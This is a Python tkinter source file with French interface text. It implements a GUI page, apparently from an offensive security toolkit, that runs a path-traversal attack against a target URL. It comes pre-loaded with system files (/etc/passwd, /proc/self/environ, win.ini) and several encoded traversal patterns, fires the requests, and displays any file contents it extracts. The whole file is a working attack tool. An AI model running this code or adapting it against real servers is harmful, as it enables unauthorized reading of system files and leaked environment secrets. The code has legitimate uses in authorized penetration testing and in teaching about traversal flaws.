import tkinter as tk
from tkinter import Toplevel, scrolledtext
import requests
from threading import Thread

class PathTraversalPage(tk.Frame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.results_displayed = False #Nouveau drapeau pour éviter plusieurs fenêtres

        label = tk.Label(self, text="Page Traversée de Répertoires", font=("Arial", 16))
        label.pack(pady=20)

        tk.Label(self, text="URL cible :").pack(pady=5)
        self.url_entry = tk.Entry(self, width=50)
        self.url_entry.pack(pady=5)

        tk.Label(self, text="Fichiers cibles (séparés par des virgules) :").pack(pady=5)
        self.files_entry = tk.Entry(self, width=50)
        self.files_entry.insert(
            0,
            "/etc/passwd,/etc/hosts,/windows/win.ini,/proc/self/environ"
        )
        self.files_entry.pack(pady=5)

        tk.Label(self, text="Patterns de traversée (séparés par des virgules) :").pack(pady=5)
        self.patterns_entry = tk.Entry(self, width=50)
        self.patterns_entry.insert(0, "../, ..\\, ..%2f, ..%5c, ..%c0%af, ..%u2216, ..%252e%252e%255c")#En ajouter si nécessaire
        self.patterns_entry.pack(pady=5)

        self.start_button = tk.Button(self, text="Lancer l'attaque", command=self.start_attack)
        self.start_button.pack(pady=10)

        self.status_label = tk.Label(self, text="")
        self.status_label.pack(pady=10)

    def start_attack(self):
        url = self.url_entry.get()
        files = self.files_entry.get().split(',')
        patterns = self.patterns_entry.get().split(',')

        if not url or not files or not patterns:
            self.status_label.config(text="Erreur : Tous les champs doivent être remplis.")
            return

        self.status_label.config(text="Lancement en cours...")
        self.start_button.config(state="disabled") #Blocage du bouton "lancer l'attaque" pendant l'attaque

        # Lance l'attaque dans un thread pour ne pas bloquer l'interface
        thread = Thread(target=self.perform_attack, args=(url, files, patterns))
        thread.daemon = True
        thread.start()

    def perform_attack(self, url, files, patterns):
        results = []
        for file_path in files:
            for pattern in patterns:
                target_url = f"{url}?file={pattern}{file_path.strip()}"
                try:
                    response = requests.get(target_url, timeout=10)

                    #Étape 1 : Affiche les détails de la requête
                    results.append(f"URL testée : {target_url} (Status Code : {response.status_code})\n")

                    # Étape 2 : Analyse le contenu extrait
                    if response.status_code == 200:
                        extracted_content = response.text[:10000]
                        results.append(f"[SUCCESS] Fichier trouvé : {target_url}\nContenu extrait :\n{extracted_content}\n")

                        # Étape 3 : Détecte des réponses génériques (diagnostic en gros)
                        if "Error" in extracted_content or "Not Found" in extracted_content:
                            results.append(f"[NOTE] Réponse générique ou erreur détectée pour {target_url}.\n")
                    else:
                        results.append(f"[FAIL] {target_url} (Code : {response.status_code})\n")
                except Exception as e:
                    results.append(f"[ERROR] {target_url} - {e}\n")

        self.show_results(results)
        self.start_button.config(state="normal") # Réactive le bouton après l'attaque
        self.status_label.config(text="Attaque terminée.")

    def show_results(self, results):
        if self.results_displayed:
            return #Empêche plusieurs affichages en simultanés

        self.results_displayed = True
        results_window = Toplevel(self)
        results_window.title("Résultats de l'attaque")
        results_window.geometry("800x600")

        results_label = tk.Label(results_window, text="Résumé des résultats", font=("Arial", 14))
        results_label.pack(pady=10)

        results_text = scrolledtext.ScrolledText(results_window, wrap=tk.WORD, width=80, height=30)
        results_text.insert(tk.END, "\n".join(results))
        results_text.config(state="disabled") # Empêche la modification des résultats
        results_text.pack(pady=10, padx=10)

        close_button = tk.Button(results_window, text="Fermer", command=lambda: self.close_results(results_window))
        close_button.pack(pady=10)

    def close_results(self, window):
        window.destroy()
        self.results_displayed = False

